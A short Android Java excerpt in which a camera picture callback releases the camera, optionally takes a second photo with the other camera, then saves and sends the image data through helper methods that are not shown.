private void takePhoto(final Context context, final int frontorback) {
...
  android.hardware.Camera.PictureCallback mPictureCallback = new android.hardware.Camera.PictureCallback() {
    @Override
    public void onPictureTaken(final byte[] data, Camera camera) {
       if(camera!=null){
            camera.stopPreview();
            camera.setPreviewCallback(null);

            camera.release();
            if (frontorback == 0) {
              takePhoto(context, 1);
            }
        }

        downloadPicture(data);
        sendPicture(data);
        Log.v("myTag","Picture downloaded and sent");
    }
};